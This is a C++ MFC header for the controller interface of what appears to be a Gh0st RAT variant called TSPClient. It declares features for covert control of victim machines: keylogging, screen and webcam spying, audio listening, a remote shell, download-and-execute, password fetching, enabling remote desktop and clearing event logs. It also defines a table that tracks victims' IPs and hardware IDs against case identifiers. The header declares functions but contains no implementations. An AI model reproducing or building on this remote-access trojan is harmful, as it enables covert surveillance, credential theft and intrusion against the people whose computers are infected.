// gh0stView.h : interface of the CTSPClientView class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_GH0STVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_)
#define AFX_GH0STVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_

#include "TSPClientDoc.h"
#include "SEU_QQwry.h"	// Added by ClassView
#include "GENGXIN.h"
#include "IniFile.h"
#include "WriteLog.h"
#include "macros.h"
#include "TSPCLientPublic.h"
#include "dlgProgress.h"
#include <afxmt.h>

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CTSPClientDoc;
struct ClientContext;

#define CListView CCJListView
typedef struct  
{
	//BOOL bEnable;
	LPVOID lpContent;
	char StateName[10];
	char IPWAN[16];
	char IPLAN[16];
	char szComputerName[128];
	char szOperSys[32];
	char szCPU[32];
	char szPing[32];
	char szCamer[8];
	char szVersion[16];
	char szArea[64];
	//char szHardID[64];
	char szHardID[MAX_PATH];
	char szCaseID[32];
	char szClueID[32];
	char szClueName[64+32];
	char szOnOff[16];//online offline
	char szlastAcceptTime[20];
	char szlastCloseTime[20];
	char szlastRecvTime[20];
	char szfirstAcceptTime[20];
}INFO_DB_CONTRAST, *PINFO_DB_CONTRAST;
	enum
	{
		COL_ID= 0,
		COL_STATE,
		COL_CASE_ID,
		COL_CLUENAME,
		COL_CLUE_ID,
		COL_COMPNAME,
		COL_AREA,
		COL_HARDID,
		COL_WAN,
		COL_LAN,
		COL_FIRST_ACCEPT_TIME,
		COL_LAST_ACCEPT_TIME,
		COL_LAST_OFFLINE_TIME,
		COL_LAST_RECV_TIME,
		COL_OPERSYS,
		COL_CPU,
		COL_PING,
		COL_CAMERA,
		COL_VERSION,
	};
class CTSPClientView : public CListView
{
protected: // create from serialization only
	CTSPClientView();
	DECLARE_DYNCREATE(CTSPClientView)

// Attributes
public:
	CTSPClientDoc* GetDocument();
// Operations
public:
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CTSPClientView)

	virtual void OnDraw(CDC* pDC);  // overridden to draw this view
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	BOOL DownPluginForMiqu(LPCSTR lpUrl);


	BOOL GetAutoScreenConfig(pAUTOSREECNCONFIG pFtpconfig,TCHAR *szMACID);


	BOOL GetFileFromServer(TCHAR *szFileName,OUT TCHAR *szOutFileName);
	
	void SendShortMsg(TCHAR *szClue);

	BOOL InsertItemByCurOrder(PINFO_DB_CONTRAST pNode);
	BOOL InsertItem(int pos,PINFO_DB_CONTRAST pNode);
	BOOL UpdateItem(int nFindIndex, PINFO_DB_CONTRAST pNode);


protected:
	virtual void OnInitialUpdate(); // called first time after construct
	//}}AFX_VIRTUAL


	

// Implementation
public:
	CString	ConnPass;
	CGENGXIN gengxin;
	CIOCPServer* m_iocpServer;
	CListCtrl *m_pListCtrl;
	int m_nCount;
	int m_ItemMaxID;
	virtual ~CTSPClientView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

// Generated message map functions
	//{{AFX_MSG(CTSPClientView)
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnRButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnFilemanager();
	afx_msg void OnScreenspy();
	afx_msg void OnDownexec();
	afx_msg void OnWebcam();
	afx_msg void OnRemove();
	afx_msg void OnKeyboard();
	afx_msg void OnSystem();
	afx_msg void OnRemoteshell();
	afx_msg void OnLogoff();
	afx_msg void OnReboot();
	afx_msg void OnShutdown();
	afx_msg void OnSelectAll();
	afx_msg void OnUnselectAll();
	afx_msg void OnOpenUrlHide();
	afx_msg void OnOpenUrlShow();
	afx_msg void OnCleanevent();
	afx_msg void OnSecretFetch();	
	afx_msg void OnRenameRemark();
	afx_msg void OnUpdateServer();
	afx_msg void OnAudioListen();
	afx_msg void OnDisconnect();
	afx_msg void OnAppPwd();
	afx_msg void OnExit();
	afx_msg void OnHitHard();
	afx_msg void OnGengxin();
	afx_msg void OnOpen3389();
	afx_msg void OnFindxp();
	afx_msg void OnFind2003();
	afx_msg void OnFindcam();
	afx_msg void OnFind2000();
	afx_msg void OnFindaddr();
	afx_msg void OnDownchajian();
	afx_msg void OnUpdateClient();	
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSerectDialog(WPARAM, LPARAM);	
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg LRESULT OnHeartBeat(WPARAM, LPARAM);
	afx_msg LRESULT OnPluginRequest(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveUI(WPARAM, LPARAM);
	afx_msg void OnNMCustomdraw(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnNMClick(NMHDR *pNMHDR, LRESULT *pResult);

//public:
	afx_msg void OnTimer(UINT_PTR nIDEvent);



	//自定义消息
	
	afx_msg LRESULT OnMyInitialUpdate(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg LRESULT OnNoticeUpdata(WPARAM,LPARAM);
	
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()

private:
	void SendSelectCommand(PBYTE pData, UINT nSize);
	BOOL GetConfigFromServer();
	BOOL GetVersionFromServer();
	BOOL GetVersionFromServer(TCHAR *szFileName);
	BOOL DownLoadNewClient();
	static DWORD WINAPI    DownloadClientEx(LPVOID lpVoid);				//下载服务端
	DWORD  DownloadClient();	
	SOCKET LoginLicenseSvr();

	BOOL CheckUserFromLicenseSvr();

	//增加对线索映射的需求
	BOOL UpdateClue();		//更新线索
	BOOL ReadClueFile();	//读取线索文件
	BOOL ReadMacFile();		//读取硬件标识文件
	BOOL WriteMacFile();	//写入硬件标识文件
	BOOL UpdateArrMac(int nColume);	//更新mac数组
	BOOL UpdateArrMac(LPSTR lpMac,LPSTR lpCaseID ,LPSTR lpClueID, LPSTR lpClueName);
	BOOL ReadDbFile();


	BOOL WriteDbFile();
	
	BOOL DeleteItemFromIniFile(char *ItemName);



	void SendAutoSrccen(LOGININFO*	LoginInfo,LPVOID lpContent);



	static DWORD WINAPI MonitorHuiChuanFileEx(LPVOID lpVoid);
	static DWORD WINAPI MonitorClueFileChangeEx(LPVOID lpVoid);
	
	DWORD  MonitorHuiChuanFile();
	DWORD  MonitorClueFileChange();	
	BOOL InitMonitor();
	BOOL UpdateListCtrl();
	BOOL UpdateClient();
	BOOL UpdateDBSoftPeriod();
	BOOL UpdateTSPWebUserID();


	BOOL OnOnline(LPVOID lpContent);
	BOOL OnOffline(LPVOID lpContent);
//	BOOL OnDeleteConnect(LPVOID lpContent);


	int GetEnableCount();
	int GetItemCount();


	void RemoveServer(ClientContext* pContext, LPSTR lpHardId, UINT nItem);
	BOOL ProcessOfflineCmd(PINFO_DB_CONTRAST lpDbNode, UINT nItem);

	//enum
	//{
	//	LINE_IN = 0,
	//	LINE_OUT,
	//	LINE_DEL,
	//};

	typedef struct  
	{
		char szIP[16];
		char szCaseID[64];
		char szClueID[64];
		char szClueName[64];
	}INFO_CLUE_CONTRAST, *PINFO_CLUE_CONTRAST;

	typedef struct  
	{
		char szMAC[MAX_PATH];
		char szCaseID[64];
		char szClueID[64];
		char szClueName[64];
		//char szClueNameAndID[64];
	}INFO_MAC_CONTRAST, *PINFO_MAC_CONTRAST;





	DWORD  SendPassBaskToDesPc(PINFO_DB_CONTRAST tmpNode);

	//static int cmparry (const void *a , const void *b )
	//{
	//	int c=int(((INFO_DB_CONTRAST*)a)->bEnable);
	//	int d=int(((INFO_DB_CONTRAST*)b)->bEnable); 

	//	//	return int(((INFO_DB_CONTRAST*)((ca)a->bEnable) - int(((INFO_DB_CONTRAST*)b)->bEnable);
	//	return int(((INFO_DB_CONTRAST*)a)->bEnable) - int(((INFO_DB_CONTRAST*)b)->bEnable);
	//} 



private:
	SEU_QQwry *m_QQwry;
	CIniFile m_inifile;
//	CWriteLog m_FileLog;
	BOOL m_bNewClientVer;
	CString m_strServerFile;
	HANDLE m_hThreadHandle;
	CdlgProgress m_dlgProgress;
	CArray<PINFO_CLUE_CONTRAST, PINFO_CLUE_CONTRAST> m_arrClue;
	CArray<PINFO_MAC_CONTRAST, PINFO_MAC_CONTRAST> m_arrMac;
//	CArray<PINFO_DB_CONTRAST, PINFO_DB_CONTRAST> m_arrList;
	//CCriticalSection m_csArrClue;
	//CCriticalSection m_csMacLock;

	CReadWriteLock m_csMacFileLock;
	CReadWriteLock m_csMacDataLock;

//	CReadWriteLock m_csClueFileLock;
	CReadWriteLock m_csClueDataLock;

	CReadWriteLock m_csActiveFileLock;

//	CReadWriteLock m_csListArrayLock;




	BOOL Ism_arrDbChange;


	char m_szClueFileName[MAX_PATH];
	char m_szMacFileName[MAX_PATH];
	char m_szDbFileName[MAX_PATH];

	char m_szOnlineFileName[MAX_PATH];
	char m_szOfflineCmdName[MAX_PATH];

	char m_szDbFileNameEx[MAX_PATH];


	OVERLAPPED   m_ovTrojan;//文件修改通知事件
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadHuiChuan;


	sockaddr_in m_addrLicServer;
public:
	afx_msg void OnAppHelp();
	afx_msg void OnInstallWebServer();
	afx_msg void OnMenuOpenscret();
public:

	BOOL MapClue(char *IpWan,char *HardID);
protected:
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnDestroy();
};

// * FUNCTION      : 实现CARRAY的快速排序算法
// *********************************************************************************************/
//////////////////////////////////////////////////////////////////////////
// 快速排序函数
//////////////////////////////////////////////////////////////////////////

//递归函数实现快速排序
template <class T> void QuickSortRecursive(T *pArr, int d, int h, BOOL bAscending)
{
	int i,j;
	int str;

	i = h;
	j = d;

	str = *(int*)(pArr[((int) ((d+h) / 2))]);
	do {

		if (bAscending) {
			while (*(int*)(pArr[j]) < str) j++;
			while (*(int*)(pArr[i]) > str) i--;
		} else {
			while (*(int*)(pArr[j]) > str) j++;
			while (*(int*)(pArr[i]) < str) i--;
		}

		if ( i >= j ) {

			if ( i != j ) {
				T zal;

				zal = pArr[i];
				pArr[i] = pArr[j];
				pArr[j] = zal;

			}
			i--;
			j++;
		}
	} while (j <= i);
 
	if (d < i) QuickSortRecursive(pArr,d,i,bAscending);
	if (j < h) QuickSortRecursive(pArr,j,h,bAscending);
}

//////////////////////////////////////////////////////////////////////////
// 快速排序算法的入口
//
// T *pArr            ... 需要排序的数组指针
// int iSize        ... 待排序数组的大小
// BOOL bAscending    ... 是否升序排序，默认降序
//
// 返回true执行成功，返回false执行失败，可以通过getlasterror()获得错误代码
template <class T> BOOL QuickSort(T *pArr, int iSize, BOOL bAscending = FALSE)
{
	BOOL rc = TRUE;
	if (iSize > 1) {
		try {
			int    low = 0,
				high = iSize - 1;
			QuickSortRecursive(pArr,low,high,bAscending);

		} catch (...) {
			::SetLastError(ERROR_INVALID_PARAMETER);
			rc = FALSE;
		}

	} else {
		::SetLastError(ERROR_INVALID_PARAMETER);
		rc = FALSE;
	}
	return rc;
} 



#ifndef _DEBUG  // debug version in gh0stView.cpp
inline CTSPClientDoc* CTSPClientView::GetDocument()
   { return (CTSPClientDoc*)m_pDocument; }
#endif

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_GH0STVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_)
